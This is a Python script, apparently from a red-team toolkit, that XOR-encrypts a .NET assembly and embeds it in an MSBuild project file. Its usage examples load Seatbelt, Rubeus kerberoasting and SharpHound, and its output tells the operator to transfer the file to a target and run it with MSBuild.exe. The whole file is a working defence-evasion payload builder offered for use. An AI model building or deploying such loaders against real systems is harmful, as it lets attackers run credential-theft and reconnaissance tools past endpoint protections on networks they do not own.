#!/usr/bin/env python3
"""
build_msbuild.py -- Encrypts a .NET assembly and injects into msbuild_payload.csproj

Usage:
  python build_msbuild.py <assembly_path> [options] [-- <assembly_args>...]

  Everything after -- is passed as arguments to the loaded assembly's Main().

Examples:
  python build_msbuild.py Seatbelt.exe -- -group=all
  python build_msbuild.py Rubeus.exe -- kerberoast
  python build_msbuild.py SharpHound.exe -o ready.csproj -- -c All
  python build_msbuild.py Seatbelt.exe --key deadbeefcafebabe1234567890abcdef
"""

import argparse
import base64
import os
import sys


def xor_encrypt(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def main():
    argv = sys.argv[1:]
    assembly_args = []
    if "--" in argv:
        split_idx = argv.index("--")
        assembly_args = argv[split_idx + 1:]
        argv = argv[:split_idx]

    parser = argparse.ArgumentParser(
        description="Encrypt a .NET assembly and inject into msbuild_payload.csproj"
    )
    parser.add_argument("assembly", help="Path to .NET assembly to encrypt")
    parser.add_argument("--key", help="XOR key as hex string (auto-generated if omitted)")
    parser.add_argument("-o", "--output", help="Output file (default: msbuild_ready.csproj)")
    parser.add_argument("--template", help="Template csproj (default: msbuild_payload.csproj)")
    args = parser.parse_args(argv)

    script_dir = os.path.dirname(os.path.abspath(__file__))
    template_path = args.template or os.path.join(script_dir, "msbuild_payload.csproj")
    output_path = args.output or os.path.join(script_dir, "msbuild_ready.csproj")

    if not os.path.exists(args.assembly):
        print(f"[-] Assembly not found: {args.assembly}", file=sys.stderr)
        sys.exit(1)

    if not os.path.exists(template_path):
        print(f"[-] Template not found: {template_path}", file=sys.stderr)
        sys.exit(1)

    with open(args.assembly, "rb") as f:
        assembly_bytes = f.read()
    print(f"[*] Assembly: {args.assembly} ({len(assembly_bytes)} bytes)", file=sys.stderr)

    if args.key:
        key = bytes.fromhex(args.key)
    else:
        key = os.urandom(16)
    print(f"[*] XOR key: {key.hex()}", file=sys.stderr)

    encrypted = xor_encrypt(assembly_bytes, key)

    encrypted_b64 = base64.b64encode(encrypted).decode("ascii")
    key_b64 = base64.b64encode(key).decode("ascii")

    print(f"[*] Encrypted payload: {len(encrypted_b64)} chars base64", file=sys.stderr)

    with open(template_path, "r") as f:
        template = f.read()

    # Replace payload placeholder
    template = template.replace('"YOURPAYLOADHERE"', f'"{encrypted_b64}"')

    # Replace key placeholder
    template = template.replace('"YOURKEYHERE"', f'"{key_b64}"')

    # Replace args placeholder
    if assembly_args:
        args_lines = []
        for arg in assembly_args:
            escaped = arg.replace("\\", "\\\\").replace('"', '\\"')
            args_lines.append(f'        "{escaped}",')
        args_str = "\n".join(args_lines)
        template = template.replace("        // YOURARGS", args_str)

    # Write as pure ASCII
    template = template.encode("ascii", errors="ignore").decode("ascii")
    with open(output_path, "w", encoding="ascii") as f:
        f.write(template)

    size_kb = os.path.getsize(output_path) / 1024
    print(f"[+] Written: {output_path} ({size_kb:.0f} KB)", file=sys.stderr)
    print(f"[*] Transfer to target and run:", file=sys.stderr)
    print(f"    C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe {os.path.basename(output_path)}", file=sys.stderr)


if __name__ == "__main__":
    main()
